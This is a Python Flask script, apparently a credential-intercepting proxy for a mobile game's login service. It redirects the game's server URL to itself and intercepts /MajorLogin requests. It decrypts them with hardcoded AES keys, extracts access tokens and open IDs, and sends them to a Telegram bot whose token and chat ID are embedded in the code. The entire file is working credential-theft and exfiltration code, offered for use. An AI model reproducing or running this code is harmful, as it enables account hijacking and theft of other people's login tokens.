from flask import Flask, request, Response, jsonify
import json
import requests
import socket
from urllib.parse import urlparse, parse_qs
import httpx
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import time
import random
import os
import logging
import base64
import hashlib

# Flask App initialization
app = Flask(__name__)

# Disable logging for cleaner output
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# ANSI Colors for Terminal Styling
G = "\033[92m"
Y = "\033[93m"
R = "\033[91m"
B = "\033[94m"
W = "\033[0m"
C = "\033[96m"
M = "\033[95m"

def rgb_color(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"

def rainbow_text(text):
    colors = [
        (255, 0, 0), (255, 165, 0), (255, 255, 0),
        (0, 255, 0), (0, 255, 255), (0, 0, 255), (128, 0, 255)
    ]
    result = ""
    for i, char in enumerate(text):
        color = colors[i % len(colors)]
        result += f"\033[38;2;{color[0]};{color[1]};{color[2]}m{char}"
    return result + W

def animated_banner():
    banner = f"""
{G}╔══════════════════════════════════════════╗
{Y}║          NIROB BBZ - VIP PROXY           ║
{C}║          SECURE SERVER v2.0              ║
{M}╚══════════════════════════════════════════╝{W}
    """
    print(banner)

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

LOCAL_IP = get_local_ip()
PORT = int(os.environ.get('PORT', 5000))

# ================= CRYPTO CONFIG =================
# Try different key variations
KEY_VARIANTS = [
    b'Yg&tc%DEuh6%Zc^8',  # Original
    b'Yg&tc%DEuh6%Zc^8',  # Same
    b'6oyZDr22E3ychjM%',  # Reverse
    b'Yg&tc%DEuh6%Zc^8',  # Default
]

IV_VARIANTS = [
    b'6oyZDr22E3ychjM%',  # Original
    b'Yg&tc%DEuh6%Zc^8',  # Reverse
    b'0000000000000000',  # Null IV
    b'6oyZDr22E3ychjM%',  # Default
]

# ================= TELEGRAM CONFIG =================
BOT_TOKEN = "8859282308:AAFPrC5ooQOGxacZdnbB-ZjAQ5szGeLyf-Y"
CHAT_ID = "-1004291576288"

# ================= DECRYPTION FUNCTIONS =================

def decrypt_aes_cbc(encrypted_data, key, iv):
    """Try AES-CBC decryption with given key and IV"""
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        return decrypted.decode('utf-8', errors='ignore')
    except Exception as e:
        return None

def decrypt_api(encrypted_hex):
    """Decrypt API response with multiple key/IV combinations"""
    try:
        # Convert hex to bytes
        encrypted_bytes = bytes.fromhex(encrypted_hex)
        print(f"{Y}[DEBUG] Encrypted length: {len(encrypted_bytes)} bytes{W}")
        
        # Try all key/IV combinations
        for key in KEY_VARIANTS:
            for iv in IV_VARIANTS:
                try:
                    result = decrypt_aes_cbc(encrypted_bytes, key, iv)
                    if result and len(result) > 10:  # Valid result
                        print(f"{G}[DEBUG] Success with key: {key[:8]}... iv: {iv[:8]}...{W}")
                        print(f"{G}[DEBUG] Decrypted: {result[:100]}...{W}")
                        return result
                except:
                    continue
        
        print(f"{R}[DEBUG] All decryption attempts failed{W}")
        return "{}"
        
    except Exception as e:
        print(f"{R}[DEBUG] Decryption error: {e}{W}")
        return "{}"

def get_available_room(decrypted_data):
    """Process decrypted data with multiple parsing attempts"""
    try:
        # Try parsing as JSON
        data = json.loads(decrypted_data)
        return data
    except json.JSONDecodeError:
        # Try parsing as URL encoded
        try:
            from urllib.parse import parse_qs
            parsed = parse_qs(decrypted_data)
            if parsed:
                return parsed
        except:
            pass
        
        # Try extracting with regex
        try:
            import re
            token_match = re.search(r'"?29"?\s*[:=]\s*"?([^"&\s,}]+)"?', decrypted_data)
            openid_match = re.search(r'"?22"?\s*[:=]\s*"?([^"&\s,}]+)"?', decrypted_data)
            
            if token_match and openid_match:
                return {
                    "29": token_match.group(1),
                    "22": openid_match.group(1)
                }
        except:
            pass
        
        print(f"{Y}[DEBUG] Could not parse: {decrypted_data[:200]}{W}")
        return {}

def extract_from_base64(encrypted_text):
    """Try base64 decoding"""
    try:
        decoded = base64.b64decode(encrypted_text)
        return decoded.hex()
    except:
        return encrypted_text

# ================= TELEGRAM SENDER =================
def send_to_telegram(access_token, open_id):
    """Send captured credentials to Telegram group"""
    if access_token == "FAILED_TO_EXTRACT" or open_id == "FAILED_TO_EXTRACT":
        print(f"{Y}[!] Skipping Telegram send - invalid credentials{W}")
        return False
    
    try:
        message = f"""👑 New Token!

🔑 Token:
{access_token}

🆔 Open ID:
{open_id}

👑 Powered by: NIROB BBZ
⚡ Status: Successful Intercept
"""
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code == 200:
            print(f"{G}[✔] Token sent to Telegram!{W}")
            return True
        else:
            print(f"{R}[!] Failed to send: {response.text}{W}")
            return False
    except Exception as e:
        print(f"{R}[!] Telegram send error: {e}{W}")
        return False

# ================= PROXY HANDLER =================
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
def proxy_handler(path):
    """Main proxy handler for all requests"""
    
    full_path = f"/{path}" if path else "/"
    parsed_path = urlparse(full_path)
    path = parsed_path.path
    
    if path == "/ver.php":
        return handle_ver_php(parsed_path)
    elif path == "/MajorLogin":
        return handle_major_login()
    else:
        return Response("Not Found", status=404)

def handle_ver_php(parsed_path):
    """Handle /ver.php requests"""
    print(f"{B}[INFO] Forwarding /ver.php request...{W}")
    
    target = "https://version.ggwhitehawk.com/live/ver.php"
    headers = {k: v for k, v in request.headers.items() 
               if k.lower() not in ("host", "content-length", "connection")}
    body = request.get_data()
    
    try:
        with httpx.Client(follow_redirects=True) as client:
            r = client.request(
                request.method, 
                target, 
                params=parse_qs(parsed_path.query), 
                headers=headers, 
                content=body
            )
        
        try:
            data = r.json()
        except json.JSONDecodeError:
            data = {"raw": r.text}
        
        data["server_url"] = f"http://{LOCAL_IP}:{PORT}/"
        
        response = Response(json.dumps(data), status=r.status_code, mimetype='application/json')
        HOP_BY_HOP = {'transfer-encoding', 'connection', 'keep-alive', 'proxy-authenticate', 
                      'proxy-authorization', 'te', 'trailers', 'upgrade', 'proxy-connection'}
        for k, v in r.headers.items():
            if k.lower() not in HOP_BY_HOP and k.lower() not in ("content-length", "content-encoding"):
                response.headers[k] = v
        
        return response
        
    except Exception as e:
        print(f"{R}[!] /ver.php Error: {e}{W}")
        return Response(json.dumps({"error": str(e)}), status=500, mimetype='application/json')

def handle_major_login():
    """Handle /MajorLogin requests - VIP Trap"""
    print(f"\n{rainbow_text('[+] TARGET HIT! /MajorLogin captured!')}{W}")
    
    # Get request body
    pyl = request.get_data()
    print(f"{Y}[DEBUG] Received data length: {len(pyl)} bytes{W}")
    print(f"{Y}[DEBUG] First 50 bytes: {pyl[:50].hex()}{W}")
    
    # Try to parse as JSON first
    try:
        json_data = json.loads(pyl)
        print(f"{C}[DEBUG] Request is JSON: {json_data.keys()}{W}")
        # Try to extract token from JSON
        access_token = json_data.get('access_token') or json_data.get('token') or json_data.get('29', 'FAILED_TO_EXTRACT')
        open_id = json_data.get('open_id') or json_data.get('user_id') or json_data.get('22', 'FAILED_TO_EXTRACT')
        
        if access_token != 'FAILED_TO_EXTRACT' and open_id != 'FAILED_TO_EXTRACT':
            print(f"{G}[✔] Extracted from JSON directly!{W}")
            return send_response_with_credentials(access_token, open_id)
    except:
        pass
    
    # Try hex decryption
    try:
        hex_data = pyl.hex()
        print(f"{Y}[DEBUG] Hex length: {len(hex_data)}{W}")
        
        # Try to decrypt
        decrypted = decrypt_api(hex_data)
        print(f"{C}[DEBUG] Decrypted: {decrypted[:200]}{W}")
        
        # Parse decrypted data
        x7m_data = get_available_room(decrypted)
        print(f"{C}[DEBUG] Parsed data keys: {x7m_data.keys() if isinstance(x7m_data, dict) else 'Not dict'}{W}")
        
        # Try different keys
        access_token = x7m_data.get("29") or x7m_data.get("access_token") or x7m_data.get("token") or "FAILED_TO_EXTRACT"
        open_id = x7m_data.get("22") or x7m_data.get("open_id") or x7m_data.get("user_id") or "FAILED_TO_EXTRACT"
        
        # If still failed, try to find any token-like data
        if access_token == "FAILED_TO_EXTRACT" and isinstance(x7m_data, dict):
            for key, value in x7m_data.items():
                if isinstance(value, str) and len(value) > 20 and '.' in value:
                    access_token = value
                    print(f"{G}[DEBUG] Found token-like value in key: {key}{W}")
                    break
        
        if open_id == "FAILED_TO_EXTRACT" and isinstance(x7m_data, dict):
            for key, value in x7m_data.items():
                if isinstance(value, str) and len(value) > 5 and value.isdigit():
                    open_id = value
                    print(f"{G}[DEBUG] Found ID-like value in key: {key}{W}")
                    break
                    
    except Exception as e:
        print(f"{R}[!] Processing error: {e}{W}")
        access_token, open_id = "FAILED_TO_EXTRACT", "FAILED_TO_EXTRACT"
    
    return send_response_with_credentials(access_token, open_id)

def send_response_with_credentials(access_token, open_id):
    """Send response with credentials"""
    
    print(f"{Y}[*] Extracted Credentials:{W}")
    print(f"{G}Access Token: {access_token}{W}")
    print(f"{G}Open ID: {open_id}{W}")
    
    # Display credentials with colors
    print(f"\n{C}{'═' * 60}{W}")
    print(f"{rainbow_text('🔥 VIP ACCOUNT CAPTURED 🔥')}")
    print(f"{C}{'═' * 60}{W}")
    print(f"\n{Y}🔑 {C}Access Token:{W}")
    print(f"  {access_token}")
    print(f"\n{Y}🆔 {C}Open ID:{W}")
    print(f"  {open_id}")
    print(f"\n{C}{'═' * 60}{W}")
    print(f"{rainbow_text('👑 Powered by: NIROB BBZ')}")
    print(f"{rainbow_text('⚡ Status: Successful Intercept')}")
    print(f"{C}{'═' * 60}{W}\n")
    
    # Send to Telegram if valid
    if access_token != "FAILED_TO_EXTRACT" and open_id != "FAILED_TO_EXTRACT":
        send_to_telegram(access_token, open_id)
    else:
        print(f"{Y}[!] Credentials invalid, not sending to Telegram{W}")
    
    # Response payload
    response_payload = f"""[b][c][00FFFF]✘━━━━━━━━━━━━━[FFD3EF]ZIBON[00FFFF]━━━━━━━━━━━━✘

[FF0000]Access Token => [00FF00]{access_token} [FF0000]| Open ID => [00FF00]{open_id}

[FF00FF]System Owner: [00FFFF]SPEED [FF0000]X [FFFF00]ZIBON 
[FFFF00]TG => [FF0000]@GHOST_XAPIS

[b][c][00FFFF]✘━━━━━━━━━━━━━[FFD3EF]ZIBON[00FFFF]━━━━━━━━━━━━✘
"""
    
    return Response(response_payload, status=500, mimetype='application/octet-stream')

# ================= HEALTH CHECK =================
@app.route('/health')
def health_check():
    return jsonify({
        "status": "ok",
        "server": "NIROB BBZ - VIP PROXY",
        "version": "2.0",
        "port": PORT,
        "local_ip": LOCAL_IP
    })

@app.route('/status')
def status():
    return jsonify({
        "status": "running",
        "message": "Proxy server is active",
        "telegram_configured": bool(BOT_TOKEN and CHAT_ID)
    })

# ================= RUN FUNCTION =================
if __name__ == '__main__':
    animated_banner()
    print(f"{G}[✔] Status      : {W}{Y}Running Successfully{W}")
    print(f"{G}[✔] Port        : {W}{Y}{PORT}{W}")
    print(f"{G}[✔] Local Proxy : {W}{B}http://127.0.0.1:{PORT}/{W}")
    print(f"{G}[✔] Network IP  : {W}{B}http://{LOCAL_IP}:{PORT}/{W}")
    print(f"{rainbow_text('──────────────────────────────────────────')}")
    print(f"{Y}[*] Waiting for target requests...{W}\n")
    app.run(host='0.0.0.0', port=PORT, debug=False)
